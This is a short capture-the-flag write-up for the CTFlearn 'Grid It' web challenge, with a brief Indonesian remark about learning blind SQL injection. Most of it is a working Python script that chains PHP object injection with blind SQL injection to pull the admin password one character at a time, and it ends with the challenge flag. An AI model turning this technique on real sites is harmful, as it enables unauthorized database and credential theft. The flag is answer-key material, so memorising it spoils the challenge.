# Grid It (160 Points)
Can you bypass the security measures on the site and find the flag? I doubt it. http://web.ctflearn.com/grid
# Solved
<i>Saya tidak dapat menyelesaikannya, akan tetapi disini saya memahami tentang <b>Blind SQLI</b></i><br>
```python
import requests
import re

reg = re.compile(r'''ID: (.+?)&nbspx:''')
res = ""

for pos in range(1, 33):
    l = 0
    r = 127
    headers = {"cookie": "PHPSESSID=1fu7ppdh00530ah91l3hjqddn0"}
    data = {"x": "1", "y": "1"}
    while l < r:
        mid = int((l + r) / 2)
        requests.post("https://web.ctflearn.com/grid/controller.php?action=add_point", data=data, headers=headers)
        response = requests.get("https://web.ctflearn.com/grid/", headers=headers).text
        _id = reg.search(response).group(1)
        payload = _id +  ' and ord(mid((select password from user where username="admin" limit 0, 1), ' +  str(pos) + ',1))>' + str(mid)
        length = len(payload)
        resp = requests.get('''https://web.ctflearn.com/grid/controller.php?action=delete_point&point=O:5:"point":3:{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:'''+str(length)+''':"%s";}'''%payload,headers=headers,allow_redirects=False).text
        resp = requests.get("https://web.ctflearn.com/grid/", headers=headers).text
        if _id not in resp:
            l = mid + 1
        else:
            r = mid
    if l == 0:
        break
    res = res + chr(l)
    print("Result Blind SQLI: " + str(res))
```
https://github.com/terjanq/Flag-Capture/tree/master/Practice/CTFLearn/GridIt#grid-it---write-up-by-terjanq<br>
Flag : <b>ctflearn{obj3ct_inj3ct1on}</b>